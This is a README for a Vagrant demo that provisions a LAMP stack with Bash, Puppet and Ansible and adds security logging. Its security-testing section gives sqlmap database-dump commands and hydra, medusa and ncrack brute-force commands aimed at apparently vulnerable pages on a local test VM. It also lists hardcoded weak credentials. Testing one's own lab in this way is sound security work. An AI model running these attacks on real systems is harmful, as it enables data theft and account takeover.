# vagrant-lamp-provision

Vagrant based demo of provisioning a LAMP stack using:
* Bash
* Puppet
* Ansible

I wrote this purely as a demo to show what the differences are between the
various ways of provisioning servers, and how much more effective and easier
it is to maintain Puppet and Ansible versus Bash. I chose the LAMP stack since
it's moderately complex. I chose Ubuntu 16.04 Xenial LTS 64-bit, since it's
the distro I use most often. This demo also includes security logging and
monitoring with Apache mod_security2 and MySQL McAfee audit plugin.



## Results

```shell
cd ./vagrant-lamp-provision/provision/bash
find . -name '*.*' | xargs wc -l
2254 total

cd ./vagrant-lamp-provision/provision/bash
find . -name '*.pp' | xargs wc -l
231 total

cd ./vagrant-lamp-provision/provision/ansible
find . -name '*.*' | xargs wc -l
171 total
```



## Deploy

```shell
git clone
cd ./vagrant-lamp/environments/ansible
vagrant up

# http://127.0.0.1:8080

vagrant ssh

mysql -h 127.0.0.1 -u root -ptoor
```

## Bash

Bash Tasks:
- system tools
- firewall
- ntp timezone
- apache
- php
- mysql
- composer


## Ansible

Ansible Roles:
- geerlingguy.firewall
- geerlingguy.ntp
- geerlingguy.git
- geerlingguy.apache
- geerlingguy.mysql
- geerlingguy.php-versions
- geerlingguy.php
- geerlingguy.apache-php-fpm
- geerlingguy.php-mysql
- geerlingguy.composer
- apolloclark.mysql-deploy

## Puppet

Puppet Modules:
- system-tools
- apache2
- mysql-server
- php

---

## PHP Tests
```shell
vagrant ssh
cd /var/www/html/public

# install Composer dependencies
composer install --no-progress

# use Composer, run all tests
composer test

# use PHPUnit, run all tests
phpunit

# use PHPUnit, run all tests, with verbose output
phpunit --debug

# use PHPUnit, run specific test
phpunit ./tests/unit/SQLiGetTest

```


## Database

```shell
# mysql cheatsheet
# https://gist.github.com/apolloclark/1ef9e0b53525cb14fdcffd5188d751d3

# connect to mysql database
mysql -h 127.0.0.1 -u root -ptoor testdb
mysql -h 127.0.0.1 -u test-user -pH7SCw60iKG2jjW%G testdb

# check current allowed users
mysql -h 127.0.0.1 -u test-user -pH7SCw60iKG2jjW%G testdb \
  -e "SELECT User, Host, authentication_string FROM mysql.user;"

# check permissions
SELECT User,Host,Password,Grant_priv,Super_priv FROM mysql.user;
```



## Configs
```shell
# Apache
sudo nano /etc/apache2/apache2.conf
sudo nano /etc/apache2/sites-available/15-example.conf
sudo nano /etc/apache2/conf-available/25-example.conf

sudo nano /etc/apache2/conf-available/php5.6-fpm.conf
sudo nano /etc/apache2/conf-available/modsecurity.conf
sudo nano /etc/apache2/sites-available/vhosts.conf

# PHP
sudo nano /etc/php/5.6/apache2/php.ini

# MySQL
sudo nano /etc/mysql/my.cnf

# show the mysql audit settings
SHOW GLOBAL VARIABLES like 'audit%';
```



## Logs
```shell
# Site
sudo nano /var/log/apache2/site_audit.log
sudo nano /var/log/apache2/site_access.log
sudo nano /var/log/apache2/site_error.log

# Apache
sudo nano /var/log/apache2/access.log
sudo nano /var/log/apache2/other_vhosts_access.log
sudo nano /var/log/apache2/error.log

# PHP
sudo nano /var/log/php_error.log
sudo nano /var/log/php5.6-fpm.log


# MySQL
sudo grep -F 'audit' /var/log/mysql/error.log
sudo grep -F 'Access' /var/log/mysql/error.log
sudo nano /var/log/mysql/error.log
sudo nano /var/log/mysql/audit.log

# SSH
sudo nano /var/log/auth.log
sudo grep -F 'vagrant' /var/log/auth.log

```



## Security testing
```shell

# https://gist.github.com/apolloclark/1ef9e0b53525cb14fdcffd5188d751d3
# https://github.com/sqlmapproject/sqlmap/wiki/Usage

# clear the logs
sudo truncate -s0 /var/www/html/example/logs/access_log.log
sudo truncate -s0 /var/log/mysql/audit.log

# watch the apache access log
sudo tail -f /var/www/html/example/logs/access_log.log

# watch the mysql audit log
sudo tail -f /var/log/mysql/audit.log

# watch the mysql audit log, with JSON syntax highlighting
sudo tail -f /var/log/mysql/audit.log | jq '.'



# McAfee audit plugin, watch the log file, with JSON syntax highlighting, showing only the query
sudo tail -f /var/log/mysql/audit.log | jq '.query'

# McAfee audit plugin, copy the log file
sudo cp /var/log/mysql/audit.log /var/www/html/example/logs/mcafee_audit_$(date +"%Y-%m-%d_%H-%M-%S").log

# McAfee audit plugin, print all queries to a file
cat /var/log/mysql/audit.log | \
    jq '.query' | tr -d '"' | sed G \
    > /var/www/html/example/logs/mcafee_audit_sql_$(date +"%Y-%m-%d_%H-%M-%S").log



# Percona audit plugin, watch the log file, with JSON syntax highlighting, showing only the query
sudo tail -f /var/log/mysql/audit.log | \
    jq '. | select(.audit_record.sqltext > "") | .audit_record.sqltext'

# Percona audit plugin, print queries with errors
cat /var/log/mysql/audit.log | jq '. | select(.audit_record.status != 0)'

# Percona audit plugin, copy the log file
sudo cp /var/log/mysql/audit.log /var/www/html/example/logs/percona_audit_$(date +"%Y-%m-%d_%H-%M-%S").log

# Percona audit plugin, print all queries to a file
cat /var/log/mysql/audit.log | \
    jq '. | select(.audit_record.sqltext > "") | .audit_record.sqltext' | \
    tr -d '"' > /var/www/html/example/logs/percona_audit_sql_$(date +"%Y-%m-%d_%H-%M-%S").log



# dump out the "testdb" database contents
sqlmap -u http://192.168.56.101/sqli_get.php?id=1 -p id \
    --level=5 --risk=3 --dbms=mysql --dump --batch --flush-session
    
sqlmap -u http://192.168.56.101/sqli_post.php --method=POST --data="id=1" -p id \
    --level=5 --risk=3 --dbms=mysql --dump --batch --flush-session
    
sqlmap -u http://192.168.56.101/login.php --method=POST --data="username=1&password=1" \
    -p username --level=5 --risk=3 --dbms=mysql --dump --batch --flush-session

# dump everything
sqlmap -u http://192.168.56.101/sqli.php?id=1 -p id \
    --level=5 --risk=3 --dbms=mysql --all --batch --flush-session
    
sqlmap -u http://192.168.56.101/sqli_post.php --method=POST --data="id=1" -p id \
    --level=5 --risk=3 --dbms=mysql --all --batch --flush-session
    
    
    
# Password brute force
# https://github.com/danielmiessler/SecLists/tree/master/Passwords

admin@test.com = admin
user1@test.com = password
user2@test.com = 123456
user3@test.com = abc123
user4@test.com = letmein

# hydra
# https://github.com/vanhauser-thc/thc-hydra
# https://www.thc.org/thc-hydra/
hydra http-post-form -U

hydra 192.168.56.101 \
    http-post-form "/login_post.php:username=^USER^&password=^PASS^:S=Successful" \
    -l admin@test.com \
    -P /usr/share/set/src/fasttrack/wordlist.txt \
    -F -V

hydra 192.168.56.101 \
    http-post-form "/login_post.php:username=^USER^&password=^PASS^:S=Successful" \
    -l user1@test.com \
    -P /usr/share/set/src/fasttrack/wordlist.txt \
    -F -V


# http://foofus.net/goons/jmk/medusa/medusa.html
# https://www.aldeid.com/wiki/Medusa
medusa -h 192.168.56.101 \
    -u admin@test.com \
    -P /usr/share/set/src/fasttrack/wordlist.txt \
    -M web-form \
    -m FORM:"login_post.php" \
    -m DENY-SIGNAL:"Incorrect login" \
    -m FORM-DATA:"post?username=&password=&submit=submit" \
    -F -t 1 -T 1 -v 6 -w 10

ncrack -m http \
    --user admin@test.com \
    --pass password \
    http://192.168.56.101,path=/login_post.php \
    -g -vv
```
